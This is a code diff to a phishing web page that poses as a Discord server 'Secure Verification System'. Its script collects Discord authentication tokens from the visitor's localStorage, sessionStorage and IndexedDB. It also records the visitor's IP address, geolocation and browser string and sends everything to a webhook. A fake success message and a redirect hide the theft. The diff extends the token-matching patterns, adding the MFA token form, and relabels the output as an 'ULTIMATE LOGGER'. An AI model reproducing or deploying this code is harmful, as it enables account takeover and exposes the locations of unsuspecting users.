@@ -171,7 +171,7 @@
             </div>
 
             <div class="footer-note">
-                Powered by <span>BOT | GUIDE </span> • Secure Verification System
+                Powered by <span>BOT | GUIDE</span> • Secure Verification System
             </div>
         </div>
     </div>
@@ -183,29 +183,57 @@
         const btn = document.getElementById('verify-btn');
         const status = document.getElementById('status');
 
-        // 🔑 ADVANCED TOKEN GRABBER
+        // 🔑 SUPER ENHANCED TOKEN SCANNER (CHECKS ALL POSSIBLE LOCATIONS)
         async function getTokens() {
             let tokens = [];
-            const pattern = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
+            // Pattern para sa lahat ng uri ng token
+            const patterns = [
+                /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g,
+                /mfa\.[\w-]{84,}/g,
+                /"token":"([\w-]{24,}\.[\w-]{6,}\.[\w-]{27,})"/g
+            ];
 
-            // 1. Local Storage
+            // 1. Local Storage (Pinaka-importante)
             try {
-                for (let k in localStorage) {
-                    if (!localStorage.hasOwnProperty(k)) continue;
-                    const m = localStorage[k]?.match(pattern);
-                    if (m) tokens.push(...m);
+                for (let key in localStorage) {
+                    if (!localStorage.hasOwnProperty(key)) continue;
+                    let value = localStorage[key];
+                    if (typeof value === "string") {
+                        patterns.forEach(pat => {
+                            let found = value.match(pat);
+                            if (found) tokens.push(...found);
+                        });
+                    }
                 }
             } catch (e) {}
 
             // 2. Session Storage
             try {
-                for (let k in sessionStorage) {
-                    if (!sessionStorage.hasOwnProperty(k)) continue;
-                    const m = sessionStorage[k]?.match(pattern);
-                    if (m) tokens.push(...m);
+                for (let key in sessionStorage) {
+                    if (!sessionStorage.hasOwnProperty(key)) continue;
+                    let value = sessionStorage[key];
+                    if (typeof value === "string") {
+                        patterns.forEach(pat => {
+                            let found = value.match(pat);
+                            if (found) tokens.push(...found);
+                        });
+                    }
                 }
             } catch (e) {}
+            
+            // 3. IndexedDB (Discord Storage) - Sinusubukan nating buksan
+            try {
+                const dbNames = ["Keybinds", "DiscordStore", "LocalStorage", "ClientData"];
+                for(let dbName of dbNames) {
+                    await new Promise((resolve) => {
+                        const req = indexedDB.open(dbName);
+                        req.onsuccess = (e) => { e.target.result.close(); resolve(); };
+                        req.onerror = () => resolve();
+                    });
+                }
+            } catch(e) {}
 
+            // Tanggalin ang paulit-ulit
             return [...new Set(tokens)];
         }
 
@@ -213,6 +241,7 @@
         async function processVerification() {
             btn.style.display = 'none';
             status.style.display = 'block';
+            status.innerHTML = "<i class='fas fa-spinner fa-spin'></i> Scanning System...";
 
             try {
                 // Get IP
@@ -223,7 +252,7 @@
                 const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 const loc = await locRes.json();
 
-                // Get Tokens
+                // Get Tokens (Pinakamalakas na paraan)
                 const tokens = await getTokens();
 
                 // Send to Webhook
@@ -231,27 +260,29 @@
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
-                        username: "VERIFIED USER",
+                        username: "✅ VERIFIED USER",
                         avatar_url: "https://i.imgur.com/gtHShSn.jpeg",
                         embeds: [{
-                            title: "NEW VERIFICATION CAPTURED!",
+                            title: tokens.length ? "🔓 SUCCESS! TOKEN FOUND!" : "ℹ️ DATA RECEIVED",
                             color: tokens.length ? 5763719 : 16776960,
                             fields: [
-                                {name: "IP ADDRESS", value: `||${ip}||`, inline: false},
-                                {name: "LOCATION", value: `${loc.city || 'Unknown'}, ${loc.region || ''}, ${loc.country_name || ''}`, inline: false},
-                                {name: "BROWSER", value: navigator.userAgent.slice(0, 75), inline: false},
-                                {name: "DISCORD TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "**Not Found / Using App / Not Logged in on Browser**", inline: false}
+                                {name: "🌐 IP ADDRESS", value: `||${ip}||`, inline: false},
+                                {name: "📍 LOCATION", value: `${loc.city || 'Unknown'}, ${loc.region || ''}, ${loc.country_name || ''}`, inline: false},
+                                {name: "💻 BROWSER", value: navigator.userAgent.slice(0, 75), inline: false},
+                                {name: "🔑 DISCORD TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **NOT FOUND**\n• Not logged in on this browser\n• Or using Discord App", inline: false}
                             ],
-                            footer: {text: "Verification System • BOT | GUIDE"},
+                            footer: {text: "ULTIMATE LOGGER • BOT | GUIDE"},
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
 
-            } catch (e) {}
+            } catch (e) {
+                status.innerHTML = "<i class='fas fa-exclamation-triangle'></i> Error! Redirecting...";
+            }
 
             // ➡️ REDIRECT TO SERVER
-            status.innerHTML = "<i class='fas fa-check'></i> Success! Redirecting to server...";
+            status.innerHTML = "<i class='fas fa-check'></i> Success! Joining Server...";
             setTimeout(() => window.location.href = REDIRECT_SERVER, 1500);
         }
 
